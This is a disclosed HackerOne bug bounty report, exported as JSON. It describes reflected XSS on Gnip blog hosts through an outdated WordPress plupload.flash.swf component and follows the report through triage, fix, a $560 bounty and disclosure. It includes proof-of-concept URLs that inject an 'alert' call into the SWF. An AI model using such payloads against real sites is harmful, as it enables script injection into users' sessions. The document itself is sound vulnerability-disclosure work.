{"id":218451,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTg0NTE=","url":"https://hackerone.com/reports/218451","title":"[Gnip Blogs] Reflected XSS via \"plupload.flash.swf\" component vulnerable to SOME ","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-04-04T05:39:38.957Z","submitted_at":"2017-04-04T05:39:38.957Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"ysx","url":"/ysx","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-08T17:58:56.487Z","bug_reporter_agreed_on_going_public_at":"2017-04-29T05:22:39.637Z","team_member_agreed_on_going_public_at":"2017-05-08T17:58:56.435Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nThe following endpoints are exposed to reflected cross-site scripting by way of a vulnerable \"**plupload.flash.swf**\" component on WordPress.\n\nA comprehensive explanation of this vulnerability can be found on resolved report #134738:\n\n\u003e WordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file plupload.flash.swf. The code in the file attempts to remove flashVars [...] but fails to do so, enabling XSS via ExternalInterface.\n\n## Proof of Concept\n\nTo reproduce this vulnerability, please access the below Proof of Concept link in the latest version of Firefox with **Adobe Flash enabled**. I have confirmed exploitability on Windows 7 x64.\n\n```\nhttps://blog-origin.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026uid%g=XSS\u0026\n\nhttps://blog.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026uid%g=XSS\u0026\n\nhttps://engineering.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026uid%g=XSS\u0026\n\nhttps://engineering-origin.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026uid%g=XSS\u0026\n```\n\nPlease let me know if you require any additional information regarding this vulnerability.\n\nThanks!","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThe following endpoints are exposed to reflected cross-site scripting by way of a vulnerable \u0026quot;\u003cstrong\u003eplupload.flash.swf\u003c/strong\u003e\u0026quot; component on WordPress.\u003c/p\u003e\n\n\u003cp\u003eA comprehensive explanation of this vulnerability can be found on resolved report \u003ca href=\"/reports/134738\"\u003e#134738\u003c/a\u003e:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eWordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file plupload.flash.swf. The code in the file attempts to remove flashVars [...] but fails to do so, enabling XSS via ExternalInterface.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"proof-of-concept\"\u003eProof of Concept\u003c/h2\u003e\n\n\u003cp\u003eTo reproduce this vulnerability, please access the below Proof of Concept link in the latest version of Firefox with \u003cstrong\u003eAdobe Flash enabled\u003c/strong\u003e. I have confirmed exploitability on Windows 7 x64.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://blog-origin.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026amp;uid%g=XSS\u0026amp;\n\nhttps://blog.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026amp;uid%g=XSS\u0026amp;\n\nhttps://engineering.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026amp;uid%g=XSS\u0026amp;\n\nhttps://engineering-origin.gnip.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert\u0026amp;uid%g=XSS\u0026amp;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePlease let me know if you require any additional information regarding this vulnerability.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","bounty_amount":"560.0","formatted_bounty":"$560","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-05-29T05:22:39.685Z","allow_singular_disclosure_after":-113182598.58893582,"singular_disclosure_allowed":true,"vote_count":11,"voters":["eveeez","m16","khizer47","linkks","fantam1","tanim__","sumit7","spetr0x","vishnuraj","neonavatar","and 1 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1584032,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-04T22:04:50.097Z","updated_at":"2017-04-04T22:04:50.097Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1587669,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eWe consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-06T18:40:00.567Z","updated_at":"2017-04-06T18:40:00.567Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ysx","url":"/ysx"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1587688,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you @andrewsorensen, confirming the fix! Would it be possible to enquire about whether this is in-scope for the bounty program please?","markdown_message":"\u003cp\u003eThank you \u003ca href=\"/andrewsorensen\"\u003e@andrewsorensen\u003c/a\u003e, confirming the fix! Would it be possible to enquire about whether this is in-scope for the bounty program please?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-06T18:43:02.889Z","updated_at":"2017-04-06T18:43:02.889Z","actor":{"username":"ysx","cleared":false,"url":"/ysx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1643249,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi again @andrewsorensen, just wondering if you have any updates on your decision please? Apologies for the second request and thanks again for fixing the issue quickly!","markdown_message":"\u003cp\u003eHi again \u003ca href=\"/andrewsorensen\"\u003e@andrewsorensen\u003c/a\u003e, just wondering if you have any updates on your decision please? Apologies for the second request and thanks again for fixing the issue quickly!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-28T18:00:04.334Z","updated_at":"2017-04-28T18:00:04.334Z","actor":{"username":"ysx","cleared":false,"url":"/ysx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1643867,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for helping us keep Twitter safe and secure for our users!","markdown_message":"\u003cp\u003eThanks again for helping us keep Twitter safe and secure for our users!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-28T23:29:34.355Z","updated_at":"2017-04-28T23:29:34.355Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"560.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"ysx","url":"/ysx"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1644142,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you very much for the bounty! Please could we disclose this report?","markdown_message":"\u003cp\u003eThank you very much for the bounty! Please could we disclose this report?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-29T05:22:39.656Z","updated_at":"2017-04-29T05:22:39.656Z","first_to_agree":true,"actor":{"username":"ysx","cleared":false,"url":"/ysx","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1661058,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-08T17:58:56.456Z","updated_at":"2017-05-08T17:58:56.456Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1661059,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-08T17:58:56.504Z","updated_at":"2017-05-08T17:58:56.504Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":3982,"category":"researcher","content":"Multiple Gnip blogs were exposed to reflected cross-site scripting by way of an outdated `plupload.flash.swf` WordPress component. This SWF was vulnerable to Same-Origin Method Execution. Thanks to Twitter for the swift fix, and please excuse the minor typos in the initial report!","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eMultiple Gnip blogs were exposed to reflected cross-site scripting by way of an outdated \u003ccode\u003eplupload.flash.swf\u003c/code\u003e WordPress component. This SWF was vulnerable to Same-Origin Method Execution. Thanks to Twitter for the swift fix, and please excuse the minor typos in the initial report!\u003c/p\u003e\n"}]}